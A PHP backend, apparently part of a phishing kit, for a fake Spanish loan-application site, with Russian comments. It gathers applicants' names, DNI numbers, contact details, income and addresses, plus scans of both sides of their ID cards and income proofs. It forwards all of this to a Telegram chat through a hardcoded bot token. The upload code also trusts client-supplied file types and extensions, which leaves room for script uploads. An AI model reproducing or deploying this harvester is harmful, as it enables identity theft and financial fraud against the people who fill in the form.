<?php
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

// Настройки Telegram
$botToken = "8040863572:AAFz5ZUE3tGY9kw8J-w9ZGVkWo06Q84d0RU";
$chatId = "727081653";

try {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        throw new Exception('Метод не разрешен');
    }

    $applicationId = 'APP' . date('Ymd') . rand(1000, 9999);

    $personalData = [
        'fullName' => $_POST['fullName'] ?? '',
        'dni' => $_POST['dni'] ?? '',
        'phone' => $_POST['phone'] ?? '',
        'email' => $_POST['email'] ?? '',
        'birthDate' => $_POST['birthDate'] ?? '',
        'monthlyIncome' => $_POST['monthlyIncome'] ?? '',
        'address' => $_POST['address'] ?? '',
        'acceptMarketing' => isset($_POST['acceptMarketing']) ? 'Sí' : 'No'
    ];

    $loanData = [
        'amount' => $_POST['loan_amount'] ?? '0',
        'term' => $_POST['loan_term'] ?? '0',
        'returnAmount' => $_POST['loan_returnAmount'] ?? '0',
        'returnDate' => $_POST['loan_returnDate'] ?? ''
    ];

    $requiredFields = ['fullName', 'dni', 'phone', 'email'];
    foreach ($requiredFields as $field) {
        if (empty($personalData[$field])) {
            throw new Exception("Campo requerido faltante: $field");
        }
    }

    $uploadDir = 'uploads/' . $applicationId . '/';
    if (!file_exists($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }

    $uploadedFiles = [];
    $fileTypes = ['dnifront', 'dniback', 'income'];
    
    foreach ($fileTypes as $type) {
        $uploadedFiles[$type] = [];
        for ($i = 0; $i < 10; $i++) {
            $fileKey = $type . '_' . $i;
            if (isset($_FILES[$fileKey]) && $_FILES[$fileKey]['error'] === UPLOAD_ERR_OK) {
                $file = $_FILES[$fileKey];
                $allowedTypes = ['image/jpeg', 'image/png', 'image/jpg', 'application/pdf'];
                $maxSize = 5 * 1024 * 1024;
                if (!in_array($file['type'], $allowedTypes)) {
                    throw new Exception("Tipo de archivo no válido: {$file['name']}");
                }
                if ($file['size'] > $maxSize) {
                    throw new Exception("Archivo demasiado grande: {$file['name']}");
                }
                $extension = pathinfo($file['name'], PATHINFO_EXTENSION);
                $safeFileName = $type . '_' . $i . '_' . time() . '.' . $extension;
                $destination = $uploadDir . $safeFileName;
                if (move_uploaded_file($file['tmp_name'], $destination)) {
                    $uploadedFiles[$type][] = [
                        'original_name' => $file['name'],
                        'saved_name' => $safeFileName,
                        'path' => $destination,
                        'size' => $file['size']
                    ];
                } else {
                    throw new Exception("Error al subir archivo: {$file['name']}");
                }
            }
        }
    }

    // Формируем единое текстовое сообщение
    $message = "🏦 *НОВАЯ ЗАЯВКА НА ПОЛУЧЕНИЕ КРЕДИТА* 🏦\n\n";
    $message .= "📋 *Идентификатор заявки:* `{$applicationId}`\n";
    $message .= "📅 *Дата:* " . date('d/m/Y H:i:s') . "\n\n";
    $message .= "👤 *ПЕРСОНАЛЬНЫЕ ДАННЫЕ:*\n";
    $message .= "• *Nombre:* {$personalData['fullName']}\n";
    $message .= "• *DNI:* {$personalData['dni']}\n";
    $message .= "• *Телефон:* {$personalData['phone']}\n";
    $message .= "• *Email:* {$personalData['email']}\n";
    $message .= "• *Дата рождения:* {$personalData['birthDate']}\n";
    $message .= "• *Ежемесячный доход:* {$personalData['monthlyIncome']}\n";
    $message .= "• *Dirección:* {$personalData['address']}\n";
    $message .= "• *Marketing:* {$personalData['acceptMarketing']}\n\n";
    $message .= "💰 *ДАННЫЕ О КРЕДИТЕ:*\n";
    $message .= "• *Запрашиваемое количество:* {$loanData['amount']}€\n";
    $message .= "• *Срок:* {$loanData['term']} días\n";
    $message .= "• *Сумма к возврату:* {$loanData['returnAmount']}€\n";
    $message .= "• *Дата возврата:* {$loanData['returnDate']}\n\n";
    $message .= "📎 *ЗАГРУЖЕННЫЕ ДОКУМЕНТЫ:*\n";
    if (!empty($uploadedFiles['dnifront'])) $message .= "• DNI Anverso: " . count($uploadedFiles['dnifront']) . " archivo(s)\n";
    if (!empty($uploadedFiles['dniback'])) $message .= "• DNI Reverso: " . count($uploadedFiles['dniback']) . " archivo(s)\n";
    if (!empty($uploadedFiles['income'])) $message .= "• Comprobante Ingresos: " . count($uploadedFiles['income']) . " archivo(s)\n";

    // Отправляем как альбом
    sendToTelegramAsAlbum($botToken, $chatId, $message, $uploadedFiles);

    // Сохраняем JSON
    $backupData = [
        'applicationId' => $applicationId,
        'timestamp' => date('Y-m-d H:i:s'),
        'personalData' => $personalData,
        'loanData' => $loanData,
        'uploadedFiles' => $uploadedFiles
    ];
    file_put_contents($uploadDir . 'application_data.json', json_encode($backupData, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

    echo json_encode([
        'success' => true,
        'message' => 'Solicitud enviada correctamente',
        'applicationId' => $applicationId
    ], JSON_UNESCAPED_UNICODE);

} catch (Exception $e) {
    echo json_encode([
        'success' => false,
        'message' => $e->getMessage()
    ], JSON_UNESCAPED_UNICODE);
}

// Функция отправки альбома
function sendToTelegramAsAlbum($botToken, $chatId, $message, $uploadedFiles) {
    $media = [];
    $first = true;
    $postData = ['chat_id' => $chatId];

    foreach ($uploadedFiles as $type => $files) {
        foreach ($files as $file) {
            $basename = basename($file['path']);
            $item = [
                'type' => 'document',
                'media' => 'attach://' . $basename
            ];
            if ($first) {
                $item['caption'] = $message;
                $item['parse_mode'] = 'Markdown';
                $first = false;
            }
            $media[] = $item;
            $postData[$basename] = new CURLFile(realpath($file['path']));
        }
    }

    // Если файлов нет — просто отправляем текст
    if (empty($media)) {
        file_get_contents("https://api.telegram.org/bot{$botToken}/sendMessage?" . http_build_query([
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ]));
        return;
    }

    $postData['media'] = json_encode($media);
    $ch = curl_init("https://api.telegram.org/bot{$botToken}/sendMediaGroup");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}
?>
